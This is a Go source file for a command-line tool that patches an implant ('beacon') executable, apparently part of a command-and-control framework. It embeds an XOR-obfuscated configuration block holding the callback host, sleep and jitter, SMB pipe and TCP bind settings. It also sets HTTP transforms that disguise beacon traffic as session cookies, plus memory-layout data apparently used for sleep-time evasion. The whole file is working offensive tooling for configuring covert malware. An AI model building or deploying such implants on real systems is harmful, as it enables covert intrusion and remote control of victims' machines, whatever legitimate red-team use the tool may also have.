package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"hash/crc32"
	"os"
)

const (
	slotSize   = 4096
	version    = 2
	flagXOR    = 0x0001
	keySize    = 32
	headerSize = 16 + keySize
)

const (
	cfgListenerName       uint16 = 1
	cfgListenerType       uint16 = 2
	cfgProtocol           uint16 = 3
	cfgFormat             uint16 = 4
	cfgSleepTime          uint16 = 5
	cfgJitter             uint16 = 6
	cfgHTTPHost           uint16 = 100
	cfgHTTPPort           uint16 = 101
	cfgHTTPURI            uint16 = 102
	cfgHTTPReconnectCount uint16 = 103
	cfgHTTPReconnectTime  uint16 = 104
	cfgHTTPSSL            uint16 = 105
	cfgHTTPMethod         uint16 = 106
	cfgHTTPResponseHeader uint16 = 107
	cfgHTTPHBHeader       uint16 = 108
	cfgHTTPHBPrefix       uint16 = 109
	cfgHTTPEncryptKey     uint16 = 110
	cfgHTTPHostHeader     uint16 = 111
	cfgHTTPUserAgent      uint16 = 112
	cfgHTTPXForwardedFor  uint16 = 113
	cfgHTTPSSLCert        uint16 = 114
	cfgHTTPSSLKey         uint16 = 115
	cfgHTTPCallbackHost   uint16 = 116
	cfgHTTPTransform      uint16 = 117
	cfgTCPBindHost        uint16 = 200
	cfgTCPBindPort        uint16 = 201
	cfgTCPConnectTimeout  uint16 = 202
	cfgSMBPipeName        uint16 = 210
	cfgSMBConnectTimeout  uint16 = 211
	cfgSleepImageLayout   uint16 = 300
)

const (
	imageScnMemExecute = 0x20000000
	imageScnMemRead    = 0x40000000
	imageScnMemWrite   = 0x80000000

	pageNoAccess         = 0x01
	pageReadOnly         = 0x02
	pageReadWrite        = 0x04
	pageExecute          = 0x10
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40
)

const (
	cfgValueBytes uint8 = 1
)

const (
	httpTransformVersion   = 1
	httpTransformLocBody   = 1
	httpTransformLocHeader = 2
	httpTransformEncRaw    = 1
	httpTransformEncBase64 = 2
	httpTransformOutBinary = 1
	httpTransformOutPrint  = 2
)

var marker = []byte{
	0x8d, 0x71, 0x2f, 0xa4, 0x19, 0xc0, 0x46, 0x5e,
	0x93, 0x7b, 0x2a, 0xd8, 0x60, 0x1f, 0xb5, 0x0c,
}

type config struct {
	ListenerName string            `json:"listener_name"`
	ListenerType string            `json:"listener_type"`
	Protocol     string            `json:"protocol"`
	Format       string            `json:"format"`
	EncryptKey   string            `json:"encrypt_key"`
	SleepTime    *uint32           `json:"sleep_time"`
	Jitter       *uint32           `json:"jitter"`
	HTTP         httpConfig        `json:"http"`
	TCPInternal  tcpInternalConfig `json:"tcp_internal"`
	SMBInternal  smbInternalConfig `json:"smb_internal"`
}

type httpConfig struct {
	Host            string  `json:"host"`
	Port            *uint32 `json:"port"`
	CallbackHost    string  `json:"callback_host"`
	URI             string  `json:"uri"`
	ReconnectCount  *uint32 `json:"reconnect_count"`
	ReconnectTime   *uint32 `json:"reconnect_time"`
	SSL             *bool   `json:"ssl"`
	Method          string  `json:"method"`
	ResponseHeaders string  `json:"response_headers"`
	HBHeader        string  `json:"hb_header"`
	HBPrefix        string  `json:"hb_prefix"`
	EncryptKey      string  `json:"encrypt_key"`
	HostHeader      string  `json:"host_header"`
	UserAgent       string  `json:"user_agent"`
	XForwardedFor   *bool   `json:"x_forwarded_for"`
	SSLCert         string  `json:"ssl_cert"`
	SSLKey          string  `json:"ssl_key"`
}

type tcpInternalConfig struct {
	BindHost         string  `json:"bind_host"`
	BindPort         *uint32 `json:"bind_port"`
	ConnectTimeoutMS *uint32 `json:"connect_timeout_ms"`
}

type smbInternalConfig struct {
	PipeName         string  `json:"pipe_name"`
	ConnectTimeoutMS *uint32 `json:"connect_timeout_ms"`
}

func main() {
	inPath := flag.String("in", "", "input beacon exe")
	outPath := flag.String("out", "", "output patched exe")
	configPath := flag.String("config", "", "profile json")
	flag.Parse()

	if *inPath == "" || *outPath == "" || *configPath == "" {
		fmt.Fprintln(os.Stderr, "usage: patch_profile.exe -in input.exe -out output.exe -config profile.json")
		os.Exit(1)
	}

	cfg, err := readConfig(*configPath)
	if err != nil {
		fatal(err)
	}
	image, err := os.ReadFile(*inPath)
	if err != nil {
		fatal(err)
	}
	slot, err := buildSlot(cfg, image)
	if err != nil {
		fatal(err)
	}
	offset := findMarker(image)
	if offset < 0 || offset+slotSize > len(image) {
		fatal(fmt.Errorf("profile patch slot marker not found"))
	}
	copy(image[offset:offset+slotSize], slot[:])
	if err := os.WriteFile(*outPath, image, 0644); err != nil {
		fatal(err)
	}
	fmt.Printf("patched profile slot at 0x%x\n", offset)
}

func readConfig(path string) (config, error) {
	var cfg config
	data, err := os.ReadFile(path)
	if err != nil {
		return cfg, err
	}
	err = json.Unmarshal(data, &cfg)
	return cfg, err
}

func buildSlot(cfg config, image []byte) ([slotSize]byte, error) {
	var slot [slotSize]byte
	plain := buildTLV(cfg)
	if layout, ok := buildSleepImageLayoutTLV(image); ok {
		plain = appendTLV(plain, cfgSleepImageLayout, layout[:])
	}
	if len(plain) == 0 {
		return slot, fmt.Errorf("profile config produced empty TLV")
	}
	if len(plain) > slotSize-headerSize {
		return slot, fmt.Errorf("profile config too large: %d", len(plain))
	}

	key := make([]byte, keySize)
	if _, err := rand.Read(key); err != nil {
		return slot, err
	}
	encrypted := xor(plain, key)

	copy(slot[0:4], []byte("TSCF"))
	binary.BigEndian.PutUint16(slot[4:6], version)
	binary.BigEndian.PutUint16(slot[6:8], flagXOR)
	binary.BigEndian.PutUint32(slot[8:12], uint32(len(plain)))
	binary.BigEndian.PutUint32(slot[12:16], crc32.ChecksumIEEE(plain))
	copy(slot[16:16+keySize], key)
	copy(slot[headerSize:], encrypted)
	return slot, nil
}

func buildTLV(cfg config) []byte {
	var out []byte
	addU32 := func(tag uint16, v *uint32) {
		if v == nil {
			return
		}
		var b [4]byte
		binary.BigEndian.PutUint32(b[:], *v)
		out = appendTLV(out, tag, b[:])
	}
	addBool := func(tag uint16, v *bool) {
		if v == nil {
			return
		}
		b := byte(0)
		if *v {
			b = 1
		}
		out = appendTLV(out, tag, []byte{b})
	}
	addString := func(tag uint16, v string) {
		if v != "" {
			out = appendTLV(out, tag, []byte(v))
		}
	}

	addString(cfgListenerName, cfg.ListenerName)
	addString(cfgListenerType, cfg.ListenerType)
	addString(cfgProtocol, cfg.Protocol)
	addString(cfgFormat, cfg.Format)
	addU32(cfgSleepTime, cfg.SleepTime)
	addU32(cfgJitter, cfg.Jitter)
	addString(cfgHTTPHost, cfg.HTTP.Host)
	addU32(cfgHTTPPort, cfg.HTTP.Port)
	addString(cfgHTTPCallbackHost, cfg.HTTP.CallbackHost)
	addString(cfgHTTPURI, cfg.HTTP.URI)
	addU32(cfgHTTPReconnectCount, cfg.HTTP.ReconnectCount)
	addU32(cfgHTTPReconnectTime, cfg.HTTP.ReconnectTime)
	addBool(cfgHTTPSSL, cfg.HTTP.SSL)
	addString(cfgHTTPMethod, cfg.HTTP.Method)
	addString(cfgHTTPResponseHeader, cfg.HTTP.ResponseHeaders)
	addString(cfgHTTPHBHeader, cfg.HTTP.HBHeader)
	addString(cfgHTTPHBPrefix, cfg.HTTP.HBPrefix)
	encryptKey := cfg.HTTP.EncryptKey
	if cfg.EncryptKey != "" {
		encryptKey = cfg.EncryptKey
	}
	addString(cfgHTTPEncryptKey, encryptKey)
	addString(cfgHTTPHostHeader, cfg.HTTP.HostHeader)
	addString(cfgHTTPUserAgent, cfg.HTTP.UserAgent)
	addBool(cfgHTTPXForwardedFor, cfg.HTTP.XForwardedFor)
	addString(cfgHTTPSSLCert, cfg.HTTP.SSLCert)
	addString(cfgHTTPSSLKey, cfg.HTTP.SSLKey)
	addString(cfgTCPBindHost, cfg.TCPInternal.BindHost)
	addU32(cfgTCPBindPort, cfg.TCPInternal.BindPort)
	addU32(cfgTCPConnectTimeout, cfg.TCPInternal.ConnectTimeoutMS)
	addString(cfgSMBPipeName, cfg.SMBInternal.PipeName)
	addU32(cfgSMBConnectTimeout, cfg.SMBInternal.ConnectTimeoutMS)
	out = appendTLVWithType(out, cfgHTTPTransform, cfgValueBytes, buildDefaultHTTPTransformBlock())
	return out
}

func buildDefaultHTTPTransformBlock() []byte {
	var out []byte
	out = appendU16(out, httpTransformVersion)

	out = appendHTTPDataTransform(out, 1, httpTransformLocHeader, httpTransformEncBase64, 0, "Cookie", "SESSIONID=", "")
	out = appendHTTPDataTransform(out, 1, httpTransformLocBody, httpTransformEncRaw, httpTransformOutBinary, "", "", "")
	out = appendHTTPDataTransform(out, 1, httpTransformLocBody, httpTransformEncRaw, httpTransformOutBinary, "", "", "")

	out = appendHTTPDataTransform(out, 1, httpTransformLocHeader, httpTransformEncBase64, 0, "Cookie", "JSESSION=", "")
	out = appendHTTPDataTransform(out, 1, httpTransformLocBody, httpTransformEncBase64, httpTransformOutPrint, "", "", "")
	out = appendHTTPDataTransform(out, 1, httpTransformLocBody, httpTransformEncBase64, httpTransformOutPrint, "", "", "")
	return out
}

func appendHTTPDataTransform(out []byte, present, location, encoding, outputMode uint8, name, prefix, suffix string) []byte {
	out = append(out, present, location, encoding, outputMode)
	out = appendStringU16(out, name)
	out = appendStringU16(out, prefix)
	out = appendStringU16(out, suffix)
	return out
}

func appendStringU16(out []byte, value string) []byte {
	out = appendU16(out, uint16(len(value)))
	out = append(out, value...)
	return out
}

func appendU16(out []byte, value uint16) []byte {
	var b [2]byte
	binary.BigEndian.PutUint16(b[:], value)
	out = append(out, b[:]...)
	return out
}

func buildSleepImageLayoutTLV(image []byte) ([16]byte, bool) {
	var value [16]byte
	if len(image) < 0x100 || string(image[0:2]) != "MZ" {
		return value, false
	}

	ntOff := int(binary.LittleEndian.Uint32(image[0x3c:0x40]))
	if ntOff < 0 || ntOff+24 > len(image) || string(image[ntOff:ntOff+4]) != "PE\x00\x00" {
		return value, false
	}

	sectionCount := int(binary.LittleEndian.Uint16(image[ntOff+6 : ntOff+8]))
	optionalSize := int(binary.LittleEndian.Uint16(image[ntOff+20 : ntOff+22]))
	optionalOff := ntOff + 24
	if sectionCount <= 0 || optionalSize < 60 || optionalOff+optionalSize > len(image) {
		return value, false
	}

	imageSize := binary.LittleEndian.Uint32(image[optionalOff+56 : optionalOff+60])
	sectionOff := optionalOff + optionalSize
	if imageSize == 0 || sectionOff+sectionCount*40 > len(image) {
		return value, false
	}

	for i := 0; i < sectionCount; i++ {
		off := sectionOff + i*40
		if string(image[off:off+5]) != ".text" {
			continue
		}

		textSize := binary.LittleEndian.Uint32(image[off+8 : off+12])
		textRVA := binary.LittleEndian.Uint32(image[off+12 : off+16])
		rawSize := binary.LittleEndian.Uint32(image[off+16 : off+20])
		characteristics := binary.LittleEndian.Uint32(image[off+36 : off+40])
		if textSize == 0 {
			textSize = rawSize
		}
		if textSize == 0 || textRVA >= imageSize || textSize > imageSize-textRVA {
			return value, false
		}

		binary.BigEndian.PutUint32(value[0:4], imageSize)
		binary.BigEndian.PutUint32(value[4:8], textRVA)
		binary.BigEndian.PutUint32(value[8:12], textSize)
		binary.BigEndian.PutUint32(value[12:16], sectionProtect(characteristics))
		return value, true
	}

	return value, false
}

func sectionProtect(characteristics uint32) uint32 {
	exec := characteristics&imageScnMemExecute != 0
	read := characteristics&imageScnMemRead != 0
	write := characteristics&imageScnMemWrite != 0

	if exec {
		if write {
			return pageExecuteReadWrite
		}
		if read {
			return pageExecuteRead
		}
		return pageExecute
	}
	if write {
		return pageReadWrite
	}
	if read {
		return pageReadOnly
	}
	return pageNoAccess
}

func appendTLV(out []byte, tag uint16, value []byte) []byte {
	return appendTLVWithType(out, tag, 0, value)
}

func appendTLVWithType(out []byte, tag uint16, valueType uint8, value []byte) []byte {
	var h [8]byte
	binary.BigEndian.PutUint16(h[0:2], tag)
	h[2] = valueType
	binary.BigEndian.PutUint32(h[4:8], uint32(len(value)))
	out = append(out, h[:]...)
	return append(out, value...)
}

func xor(in []byte, key []byte) []byte {
	out := make([]byte, len(in))
	for i := range in {
		out[i] = in[i] ^ key[i%len(key)]
	}
	return out
}

func findMarker(image []byte) int {
	for i := 0; i+len(marker) <= len(image); i++ {
		ok := true
		for j := range marker {
			if image[i+j] != marker[j] {
				ok = false
				break
			}
		}
		if ok {
			return i
		}
	}
	return -1
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "error:", err)
	os.Exit(1)
}
